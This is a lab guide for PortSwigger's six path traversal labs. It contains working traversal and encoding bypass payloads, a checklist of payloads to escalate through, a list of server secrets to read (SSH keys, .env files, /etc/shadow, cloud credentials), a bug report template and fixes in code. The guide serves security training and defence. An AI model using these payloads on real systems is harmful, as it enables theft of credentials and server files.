# PortSwigger Web Security Academy
# 📂 Path Traversal (Directory Traversal) — Complete Lab Guide

> **Goal:** Understand every path traversal bypass technique, solve all 6 labs from scratch, and know how to find and report this bug on real targets.

---

## Table of Contents

1. [What Is Path Traversal?](#1-what-is-path-traversal)
2. [How It Works — The Core Idea](#2-how-it-works--the-core-idea)
3. [What Files Can You Read?](#3-what-files-can-you-read)
4. [How to Spot It — Where to Look](#4-how-to-spot-it--where-to-look)
5. [All 6 Labs — Complete Walkthroughs](#5-all-6-labs--complete-walkthroughs)
   - [Lab 01 — Simple Case](#lab-01--file-path-traversal-simple-case-apprentice)
   - [Lab 02 — Absolute Path Bypass](#lab-02--traversal-sequences-blocked-with-absolute-path-bypass-practitioner)
   - [Lab 03 — Sequences Stripped Non-Recursively](#lab-03--traversal-sequences-stripped-non-recursively-practitioner)
   - [Lab 04 — Superfluous URL-Decode](#lab-04--traversal-sequences-stripped-with-superfluous-url-decode-practitioner)
   - [Lab 05 — Validation of Start of Path](#lab-05--validation-of-start-of-path-practitioner)
   - [Lab 06 — Null Byte Bypass](#lab-06--validation-of-file-extension-with-null-byte-bypass-practitioner)
6. [Bypass Techniques Master List](#6-bypass-techniques-master-list)
7. [Bug Hunting Methodology for Path Traversal](#7-bug-hunting-methodology-for-path-traversal)
8. [High-Value Target Files Cheat Sheet](#8-high-value-target-files-cheat-sheet)
9. [How to Prevent Path Traversal](#9-how-to-prevent-path-traversal)
10. [Quick Reference — All Labs Summary](#10-quick-reference--all-labs-summary)

---

## 1. What Is Path Traversal?

**Path traversal** (also called **directory traversal**) is a vulnerability that lets an attacker read — and sometimes write — files on the server that they should have no access to.

Instead of reading `product-image.jpg`, an attacker manipulates the file path to read `/etc/passwd`, configuration files, source code, private keys, or anything else stored on the server's filesystem.

It's called "path traversal" because you *traverse* up the directory tree using `../` sequences (dot-dot-slash) to escape the intended directory.

### Real-world impact

| What you can read | Impact |
|------------------|--------|
| `/etc/passwd` | Usernames on the system |
| `/etc/shadow` | Hashed passwords (Linux) |
| `web.config` / `.env` | Database credentials, API keys |
| Application source code | Logic flaws, hardcoded secrets |
| SSH private keys (`/home/user/.ssh/id_rsa`) | Remote server access |
| AWS credentials (`~/.aws/credentials`) | Full cloud compromise |

In some cases, path traversal also allows **file writes** — which can lead to full Remote Code Execution (RCE).

---

## 2. How It Works — The Core Idea

### The vulnerable pattern

A web application takes a **user-supplied filename** and passes it directly into a file system operation:

```
https://shop.com/image?filename=product1.jpg
```

On the server, the code does something like:

```python
# Python (vulnerable)
filepath = "/var/www/images/" + request.get("filename")
return open(filepath).read()
```

If `filename=product1.jpg`, the server opens:
```
/var/www/images/product1.jpg   ✅ Intended
```

If `filename=../../../etc/passwd`, the server opens:
```
/var/www/images/../../../etc/passwd
= /etc/passwd   💀 Path traversal!
```

### How `../` works

Each `../` moves one directory UP the tree:

```
Starting point:  /var/www/images/
After ../        /var/www/
After ../../     /var/
After ../../../  /             ← root of the filesystem
```

So `../../../etc/passwd` from `/var/www/images/` resolves to `/etc/passwd`.

On **Windows**, the separator is `\` (backslash), but `/` also works in most cases:
```
..\..\..\windows\system32\drivers\etc\hosts
../../../windows/system32/drivers/etc/hosts
```

---

## 3. What Files Can You Read?

### Linux / Unix targets

```
/etc/passwd                    — All user accounts
/etc/shadow                    — Hashed passwords (requires root)
/etc/hosts                     — Hostname mappings
/etc/issue                     — OS version
/etc/os-release                — Distro information
/proc/version                  — Kernel version
/proc/self/environ             — Environment variables (may contain secrets)
/proc/self/cmdline             — Process command line
/proc/net/tcp                  — Open network connections
/var/log/apache2/access.log    — Web server access log
/var/log/apache2/error.log     — Web server error log
/var/log/nginx/access.log      — Nginx access log
/home/username/.ssh/id_rsa     — SSH private key
/root/.ssh/id_rsa              — Root SSH private key
/root/.bash_history            — Root bash history
/var/www/html/.env             — Environment config (DB creds, API keys)
/var/www/html/config.php       — PHP config (DB creds)
/var/www/html/wp-config.php    — WordPress config
```

### Windows targets

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM    — User account hashes (locked normally)
C:\inetpub\wwwroot\web.config     — IIS config (DB creds)
C:\Users\Administrator\.ssh\id_rsa
C:\xampp\phpMyAdmin\config.inc.php
```

---

## 4. How to Spot It — Where to Look

Path traversal hides anywhere the application serves a **file based on user input**. Train your eyes to spot these patterns:

### In URLs

```
/image?filename=photo.jpg
/download?file=report.pdf
/load?template=home.html
/view?doc=readme.txt
/static?resource=style.css
/fetch?path=assets/logo.png
/read?page=about
/include?module=header
```

### In HTTP request bodies (POST/JSON)

```json
{"filename": "document.pdf"}
{"template": "welcome.html"}
{"path": "uploads/photo.jpg"}
{"resource": "config/settings.xml"}
```

### In request headers

```
Cookie: theme=default.css
Referer: /files/report.pdf
```

### In Burp Suite — how to find them

1. Open **Proxy → HTTP History**
2. Filter by `img`, `file`, `path`, `resource`, `load`, `template`, `doc`
3. Look at **image requests** — `<img src="/image?filename=...">` is extremely common
4. Any parameter that looks like it references a file is your target

---

## 5. All 6 Labs — Complete Walkthroughs

> **Setup for every lab:**
> 1. Open the lab on PortSwigger Academy
> 2. Launch Burp Suite, browser proxied through `127.0.0.1:8080`
> 3. In Burp: Proxy → Options → enable "Intercept images" (so image requests appear in history)
> 4. Browse the shop homepage and click on any product

---

### Lab 01 — File Path Traversal, Simple Case (APPRENTICE)

**Lab URL:** `https://portswigger.net/web-security/file-path-traversal/lab-simple`

#### What the lab tests
No protection at all. The raw `../` traversal works immediately.

#### Concept
The app serves product images via:
```
GET /image?filename=50.jpg
```
The filename is passed directly to the filesystem with no validation. This is the most basic, unprotected form.

#### Step-by-Step

**Step 1:** Browse the shop. Open **Burp → Proxy → HTTP History**. Find the image request:
```
GET /image?filename=50.jpg HTTP/1.1
Host: <YOUR-LAB>.web-security-academy.net
```

**Step 2:** Right-click → **Send to Repeater** (Ctrl+R).

**Step 3:** In Repeater, change the filename parameter:
```
GET /image?filename=../../../etc/passwd HTTP/1.1
```

**Step 4:** Click **Send**. The response body contains:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

✅ Lab solved. You've read `/etc/passwd`.

#### Why it works
The server concatenates `/var/www/images/` + `../../../etc/passwd` which resolves to `/etc/passwd`. No check is performed.

#### Key lesson
This is a **P1 Critical** on any real bug bounty. If you ever see `?filename=`, `?file=`, or `?path=` — always try `../../../etc/passwd` first.

---

### Lab 02 — Traversal Sequences Blocked with Absolute Path Bypass (PRACTITIONER)

**Lab URL:** `https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass`

#### What the lab tests
The app blocks `../` sequences — but treats an absolute path as if it were a filename rooted inside the images directory. Supplying `/etc/passwd` directly works.

#### Concept
Some apps try to defend by stripping or blocking `../`. But if the filesystem call doesn't enforce a base directory (no `chroot`, no canonicalization), you can bypass this entirely by just supplying an **absolute path** like `/etc/passwd`.

```python
# Vulnerable code (simplified)
if "../" in filename:
    return error("blocked")
filepath = "/var/www/images/" + filename
# If filename = "/etc/passwd", filepath = "/etc/passwd" (absolute path wins)
```

In most operating systems, when you join a base path with an absolute path, the base path is **discarded** and the absolute path is used directly.

#### Step-by-Step

**Step 1:** Capture the image request in Burp Repeater:
```
GET /image?filename=50.jpg HTTP/1.1
```

**Step 2:** Try the simple traversal — it gets blocked:
```
GET /image?filename=../../../etc/passwd HTTP/1.1
```
Response: Error or 400.

**Step 3:** Try an absolute path instead:
```
GET /image?filename=/etc/passwd HTTP/1.1
```

**Step 4:** Response is 200 OK with the contents of `/etc/passwd`.

✅ Lab solved.

#### Why it works
The app checks for `../` and blocks it. But it doesn't validate that the path stays within `/var/www/images/`. When you supply `/etc/passwd`, Python's `os.path.join()` (and similar functions in other languages) discards the base directory entirely when the second argument is an absolute path.

#### Key lesson
When `../` is blocked, **always try an absolute path next**. It's your first bypass attempt.

---

### Lab 03 — Traversal Sequences Stripped Non-Recursively (PRACTITIONER)

**Lab URL:** `https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively`

#### What the lab tests
The app strips `../` from the input — but only **once** (non-recursively). By nesting traversal sequences, the payload survives the stripping.

#### Concept
A naive defence strips `../` from the input in a single pass:

```
Input:   ....//....//....//etc/passwd
Strip:   removes all ../ occurrences once
Result:  ../../../etc/passwd  ← still a valid traversal!
```

Or with a different nesting style:

```
Input:   ..././..././..././etc/passwd
Strip:   removes ../
Result:  ../../etc/passwd  ← still traversal
```

The trick: build a string that **contains** `../` inside it so that after stripping, valid `../` sequences remain.

#### How to construct the payload

The server strips `../` once. So embed `../` inside a longer sequence:

```
....//  →  after stripping ../  →  ../
```

Because `....//` = `.. + ../ + /` — when `../` is removed from the middle, you're left with `../`.

Three levels deep:
```
....//....//....//etc/passwd
```
After strip:
```
../../../etc/passwd
```

#### Step-by-Step

**Step 1:** Capture the image request in Burp Repeater.

**Step 2:** Try simple traversal — it gets stripped to nothing useful:
```
GET /image?filename=../../../etc/passwd HTTP/1.1
```
Response: Error (stripped to `etc/passwd`, file not found).

**Step 3:** Send the nested payload:
```
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
```

**Step 4:** Response is 200 OK with `/etc/passwd` contents.

✅ Lab solved.

#### Alternative payload formats

```
..././..././..././etc/passwd
....\/....\/....\/etc/passwd   (Windows backslash variant)
```

#### Key lesson
Whenever you suspect a strip filter, try nested/doubled traversal sequences. Non-recursive stripping is a very common developer mistake.

---

### Lab 04 — Traversal Sequences Stripped with Superfluous URL-Decode (PRACTITIONER)

**Lab URL:** `https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode`

#### What the lab tests
The app blocks `../` — but decodes the URL **after** checking for it. By URL-encoding the `/` (or the whole sequence), your traversal sneaks past the check and gets decoded later.

#### Concept — Understanding URL Encoding

URL encoding replaces characters with `%XX` (hex code):

```
.  =  .    (dot, not encoded)
/  =  %2F  (forward slash URL-encoded)
.  =  %2E  (dot URL-encoded)
```

The defence flow in the vulnerable app:

```
1. App receives:   ..%2F..%2F..%2Fetc/passwd
2. App checks for ../  → not found (/ is encoded as %2F)  ✅ passes check
3. App URL-decodes the input:  ../../../etc/passwd
4. App opens file:  /var/www/images/../../../etc/passwd = /etc/passwd  💀
```

The check happens BEFORE decoding — so the encoded payload bypasses the filter.

#### Double URL Encoding (when single doesn't work)

If the app decodes twice before using the file, you need to **double-encode**:

```
/   →   %2F   →   %252F   (% itself encoded as %25)
```

So `..%2F` becomes `..%252F` for double-encoding.

The flow:
```
1. Check: no ../ found (sees ..%252F)  ✅
2. First decode: ..%2F
3. Second decode: ../
4. Open file: traversal succeeds  💀
```

#### Step-by-Step

**Step 1:** Capture the image request in Burp Repeater.

**Step 2:** Try simple traversal — blocked.

**Step 3:** Try URL-encoding the slash:
```
GET /image?filename=..%2F..%2F..%2Fetc/passwd HTTP/1.1
```

If this works → ✅ Lab solved.

**Step 4:** If step 3 doesn't work, try double URL-encoding:
```
GET /image?filename=..%252F..%252F..%252Fetc/passwd HTTP/1.1
```

**Step 5:** Or try encoding the dots too:
```
GET /image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd HTTP/1.1
```

**Step 6:** The response contains `/etc/passwd`.

✅ Lab solved. The official solution uses `..%2f..%2f..%2fetc/passwd`.

#### All encoding variants to try

```
../          →  Plain (try first)
..%2F        →  URL-encode /
%2e%2e/      →  URL-encode .
%2e%2e%2f    →  URL-encode both . and /
..%252F      →  Double URL-encode /
%252e%252e%252f  →  Double URL-encode everything
..%c0%af     →  Non-standard (overlong UTF-8 encoding of /)
..%ef%bc%8f  →  Full-width / character
```

#### Key lesson
URL encoding is one of the most powerful bypass tools. Whenever a filter blocks `../`, immediately try encoding variations. Burp Suite's Decoder tab makes this easy — paste your payload, select "URL encode all characters".

---

### Lab 05 — Validation of Start of Path (PRACTITIONER)

**Lab URL:** `https://portswigger.net/web-security/file-path-traversal/lab-validation-start`

#### What the lab tests
The app requires the filename to start with a specific base directory (e.g., `/var/www/images/`). You bypass this by including the required prefix, then appending traversal sequences to escape it.

#### Concept
The validation logic does something like:

```python
if not filename.startswith("/var/www/images/"):
    return error("invalid path")
filepath = filename  # Uses the full path directly
```

This check ensures the path *starts* with the right directory — but it doesn't verify the path actually *stays* inside it. You can satisfy the prefix check and then traverse out:

```
/var/www/images/../../../etc/passwd
```

This starts with `/var/www/images/` ✅, but resolves to `/etc/passwd` 💀.

#### Step-by-Step

**Step 1:** Capture the image request in Burp Repeater.

**Step 2:** Try simple traversal:
```
GET /image?filename=../../../etc/passwd HTTP/1.1
```
Response: Error — "must start with /var/www/images/".

**Step 3:** Include the required base path, then traverse out:
```
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
```

**Step 4:** The server accepts the path (prefix check passes), resolves it (the `../` sequences navigate out of `/var/www/images/`), and returns `/etc/passwd`.

✅ Lab solved.

#### Why it works
String prefix checks are not path security. The OS resolves `..` sequences after the check passes. The fix requires **canonicalizing** the path first, then checking if it starts with the allowed base directory.

#### Key lesson
When you see a "path must start with X" error, always try prepending that prefix before your traversal sequences.

---

### Lab 06 — Validation of File Extension with Null Byte Bypass (PRACTITIONER)

**Lab URL:** `https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass`

#### What the lab tests
The app requires the filename to end with `.png`. You bypass this using a **null byte** (`%00`) which terminates the string in C-based languages, causing the extension check to pass while the OS ignores everything after the null byte.

#### Concept — What Is a Null Byte?

A null byte is the character `\0` (ASCII value 0, URL-encoded as `%00`). In C and C-based languages (C, PHP, older versions of Perl), a null byte **terminates a string** — everything after it is ignored.

So this filename:
```
../../../etc/passwd%00.png
```

Is seen by the validation code as:
```
../../../etc/passwd\0.png
```

The check: "does it end with `.png`?" → YES (the string appears to end in `.png`) ✅

But when the OS opens the file, C-based file APIs stop at the null byte:
```
../../../etc/passwd   ← what actually gets opened
```

#### Important note on versions
Null byte bypass works on:
- PHP versions **before 5.3.4** (patched in 2010)
- C extensions and native file operations
- Some older frameworks

In modern PHP (5.3.4+), `open()` calls handle null bytes differently. The PortSwigger lab is configured to simulate a vulnerable environment.

#### Step-by-Step

**Step 1:** Capture the image request in Burp Repeater.

**Step 2:** Try simple traversal:
```
GET /image?filename=../../../etc/passwd HTTP/1.1
```
Response: Error — must end with `.png`.

**Step 3:** Add a null byte before the required extension:
```
GET /image?filename=../../../etc/passwd%00.png HTTP/1.1
```

**Step 4:** The validation checks: "does `../../../etc/passwd%00.png` end in `.png`?" → YES.
The file system opens: `../../../etc/passwd` (stops at null byte).

**Step 5:** Response contains `/etc/passwd`.

✅ Lab solved.

#### Variations to try

```
../../../etc/passwd%00.png    — Standard null byte
../../../etc/passwd%2500.png  — Double-encoded null byte (%25 = %)
../../../etc/passwd\0.png     — Literal backslash-zero (rarely works)
../../../etc/passwd%00        — Null byte without extension (if no extension check)
```

#### Key lesson
Null byte injection is an older but still relevant technique. Always try it when the app enforces a file extension. It's particularly effective against legacy PHP apps — and there are millions of them still running.

---

## 6. Bypass Techniques Master List

Use this as your testing checklist. Try each one when the previous is blocked.

### Tier 1 — Try First (No Encoding)

```
../../../etc/passwd              — Basic traversal (Linux)
..\..\..\windows\win.ini         — Basic traversal (Windows)
/etc/passwd                      — Absolute path
```

### Tier 2 — Path Obfuscation

```
....//....//....//etc/passwd     — Non-recursive strip bypass
..././..././..././etc/passwd     — Alternative non-recursive bypass
....\/....\/....\/etc/passwd     — Backslash variant
```

### Tier 3 — URL Encoding

```
..%2F..%2F..%2Fetc/passwd        — URL-encode /
%2e%2e/%2e%2e/%2e%2e/etc/passwd  — URL-encode .
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd  — URL-encode both
..%252F..%252F..%252Fetc/passwd  — Double URL-encode /
%252e%252e%252f × 3 + etc/passwd — Double URL-encode everything
..%c0%af..%c0%af..%c0%afetc/passwd  — Overlong UTF-8 /
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd  — Full-width /
```

### Tier 4 — Prefix / Suffix Requirements

```
/var/www/images/../../../etc/passwd    — Prefix bypass
/required/base/../../../etc/passwd     — Generic prefix bypass
../../../etc/passwd%00.png             — Null byte + required extension
../../../etc/passwd%2500.png           — Double-encoded null byte
```

### Tier 5 — Advanced Combinations

```
/var/www/images/....//....//....//etc/passwd    — Prefix + non-recursive
/var/www/images/..%2F..%2F..%2Fetc%2Fpasswd    — Prefix + URL encode
../../../etc/passwd%00.png with encoded traversal
```

### Windows-Specific

```
..\..\..\windows\win.ini
..%5C..%5C..%5Cwindows%5Cwin.ini    (%5C = \)
..%255C..%255C..%255Cwindows/win.ini  (double-encoded \)
```

---

## 7. Bug Hunting Methodology for Path Traversal

### Step 1: Reconnaissance — Find File Parameters

```bash
# In your target's JavaScript bundles, search for:
grep -r "filename\|filepath\|file=\|path=\|template=\|resource=\|load=\|doc=" js/

# In Burp Suite:
# Proxy → HTTP History → Filter → tick "Images"
# Look for parameters: filename, file, path, template, resource, load, doc, page, module, include
```

### Step 2: Baseline — Understand Normal Behaviour

Before attacking, understand what normal looks like:
1. What does a valid request look like?
2. What HTTP status code does a valid file return?
3. What does a non-existent file return? (404, 400, or 500?)
4. Does the response body differ or just the status code?

### Step 3: Test Systematically

For each file parameter found, run this sequence:

```
Test 1: ../../../etc/passwd           (basic)
Test 2: /etc/passwd                   (absolute path)
Test 3: ....//....//....//etc/passwd  (non-recursive)
Test 4: ..%2F..%2F..%2Fetc/passwd     (URL-encoded)
Test 5: ..%252F..%252F..%252Fetc/passwd (double-encoded)
Test 6: /required_prefix/../../../etc/passwd (if prefix required)
Test 7: ../../../etc/passwd%00.png    (if extension required)
```

Stop as soon as you get a 200 response with file content.

### Step 4: Determine Depth

You need enough `../` to reach the root. Try increasing depth:

```
../etc/passwd           (1 level up)
../../etc/passwd        (2 levels)
../../../etc/passwd     (3 levels)  ← usually enough for web roots
../../../../etc/passwd  (4 levels)
../../../../../etc/passwd (5 levels)
../../../../../../etc/passwd (6 levels, very deep)
```

Extra `../` beyond the root are ignored by the OS, so 10× `../` still resolves correctly:
```
../../../../../../../../../../../../../etc/passwd   ← always works
```

### Step 5: Escalate — Read High-Value Files

Once you have basic traversal working:

```
# Config files
../../../var/www/html/.env
../../../var/www/html/config.php
../../../var/www/html/wp-config.php
../../../etc/apache2/sites-enabled/000-default.conf

# Credentials and keys
../../../root/.ssh/id_rsa
../../../home/user/.ssh/id_rsa
../../../etc/shadow

# Application secrets
../../../proc/self/environ
../../../proc/self/cmdline
```

### Step 6: Write Your Report

A good path traversal report includes:

```
Title: Path Traversal in /image?filename= allows reading arbitrary server files

Severity: Critical (P1)

Summary:
The filename parameter on /image endpoint does not validate or sanitize
user-supplied input, allowing an attacker to read arbitrary files on
the server filesystem.

Steps to Reproduce:
1. Send the following request:
   GET /image?filename=../../../etc/passwd HTTP/1.1
   Host: target.com

2. The server responds with the contents of /etc/passwd

Impact:
An attacker can read:
- /etc/passwd (system user accounts)
- /etc/shadow (hashed passwords, if readable)
- Application config files containing database credentials
- SSH private keys
- Environment files (.env) containing API keys and secrets

This can lead to full server compromise, credential theft, and data breach.

Remediation:
- Validate and canonicalize file paths server-side
- Reject any path that doesn't resolve within the expected base directory
- Avoid passing user input directly to filesystem APIs
- Use an allowlist of permitted filenames/file IDs instead of user-supplied paths

PoC Request:
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: target.com
Cookie: session=...
```

---

## 8. High-Value Target Files Cheat Sheet

### Linux/Unix — Read These in Order

```
Priority 1 — Quick wins
/etc/passwd                     Usernames, home directories, shells
/etc/hosts                      Internal network hostnames
/proc/version                   OS and kernel version
/proc/self/environ              Environment variables (often has secrets)

Priority 2 — Credentials
/etc/shadow                     Password hashes (needs root read perms)
/root/.ssh/id_rsa               Root SSH private key
/home/$user/.ssh/id_rsa         User SSH private key
/root/.bash_history             Commands run as root

Priority 3 — App config
/var/www/html/.env              Laravel/Node .env files (DB, API keys)
/var/www/html/config.php        PHP app config
/var/www/html/wp-config.php     WordPress DB credentials
/var/www/html/settings.py       Django settings (SECRET_KEY, DB)
/var/www/html/config/database.yml  Rails database config
/etc/apache2/sites-available/   Apache vhost config
/etc/nginx/sites-available/     Nginx config

Priority 4 — Cloud/Infra
/proc/self/environ              May contain AWS_ACCESS_KEY_ID
~/.aws/credentials              AWS credentials file
/var/run/secrets/kubernetes.io/serviceaccount/token  K8s service token
```

### Windows

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa
C:\xampp\htdocs\config.php
C:\wamp\www\config.php
C:\Program Files\Apache\conf\httpd.conf
```

---

## 9. How to Prevent Path Traversal

As a security researcher you need to understand fixes — both for writing quality reports and for interviews.

### Best Practice 1: Don't pass user input to filesystem APIs

The safest approach — redesign the feature:

```python
# VULNERABLE — user controls the filename
filename = request.get("filename")
file = open("/var/www/images/" + filename)

# SAFE — use an ID to look up the filename from a trusted map
file_id = request.get("id")
file_map = {1: "product1.jpg", 2: "product2.jpg"}
filename = file_map.get(file_id)
if filename:
    file = open("/var/www/images/" + filename)
```

### Best Practice 2: Canonicalize then validate

If you must use user input, resolve the full path first, then confirm it's inside the allowed directory:

```python
import os

BASE_DIR = "/var/www/images"

def safe_open(user_filename):
    # Resolve the full path (resolves ../, symlinks, etc.)
    full_path = os.path.realpath(os.path.join(BASE_DIR, user_filename))
    
    # Check it's still inside the base directory
    if not full_path.startswith(BASE_DIR + os.sep):
        raise SecurityError("Path traversal detected!")
    
    return open(full_path)
```

Key: `os.path.realpath()` (or equivalent) resolves ALL traversal sequences BEFORE the check.

### Best Practice 3: Allowlist filenames

Only permit filenames that match an expected pattern:

```python
import re

def is_safe_filename(filename):
    # Only allow alphanumeric, dash, underscore, dot — NO slashes
    return bool(re.match(r'^[a-zA-Z0-9_\-]+\.[a-zA-Z]{2,5}$', filename))
```

### What NOT to do (common mistakes)

```python
# ❌ WRONG: Blocklist approach — easily bypassed
if "../" in filename:
    return error("blocked")

# ❌ WRONG: Strip traversal sequences — non-recursive bypass
filename = filename.replace("../", "")

# ❌ WRONG: Check prefix without canonicalizing
if not filename.startswith("/var/www/images/"):
    return error("blocked")

# ❌ WRONG: Check extension without canonicalizing
if not filename.endswith(".png"):
    return error("blocked")
```

All of these can be bypassed using the techniques in this guide.

---

## 10. Quick Reference — All Labs Summary

| # | Lab Name | Difficulty | Core Bypass Technique | Payload |
|---|----------|-----------|----------------------|---------|
| 01 | Simple case | 🟢 Apprentice | No protection | `../../../etc/passwd` |
| 02 | Absolute path bypass | 🟡 Practitioner | Absolute path instead of relative | `/etc/passwd` |
| 03 | Stripped non-recursively | 🟡 Practitioner | Nested traversal sequences | `....//....//....//etc/passwd` |
| 04 | Superfluous URL-decode | 🟡 Practitioner | URL-encode the slash or dot | `..%2F..%2F..%2Fetc/passwd` |
| 05 | Validation of start of path | 🟡 Practitioner | Prepend required base path | `/var/www/images/../../../etc/passwd` |
| 06 | Null byte bypass | 🟡 Practitioner | Null byte before required extension | `../../../etc/passwd%00.png` |

### Decision Tree — Which Bypass to Use?

```
Try ../../../etc/passwd
│
├── Works? → ✅ Done (Lab 01)
│
└── Blocked? Try /etc/passwd (absolute path)
    │
    ├── Works? → ✅ Done (Lab 02)
    │
    └── Blocked? Try ....//....//....//etc/passwd (nested)
        │
        ├── Works? → ✅ Done (Lab 03)
        │
        └── Blocked? Try ..%2F..%2F..%2Fetc/passwd (URL encode)
            │
            ├── Works? → ✅ Done (Lab 04)
            │
            └── Blocked? Try /required_base/../../../etc/passwd (prefix)
                │
                ├── Works? → ✅ Done (Lab 05)
                │
                └── Blocked? Try ../../../etc/passwd%00.png (null byte)
                    │
                    └── Works? → ✅ Done (Lab 06)
```

---

## After Completing These Labs — What You Can Do

✅ Identify file-serving parameters in any web application  
✅ Execute basic `../` traversal to read `/etc/passwd`  
✅ Bypass absolute-path-only restrictions  
✅ Bypass non-recursive strip filters with nested sequences  
✅ Use URL encoding (single and double) to evade input filters  
✅ Bypass start-of-path prefix validation  
✅ Use null byte injection to bypass file extension checks  
✅ Read high-value files: config files, `.env`, SSH keys  
✅ Write a clear, impactful bug bounty report for path traversal  
✅ Explain the correct fix to developers  

---

*Guide compiled from PortSwigger Web Security Academy — https://portswigger.net/web-security/file-path-traversal*  
*Last verified: June 2026*  
*For educational and authorised testing purposes only. Never test systems without explicit written permission.*
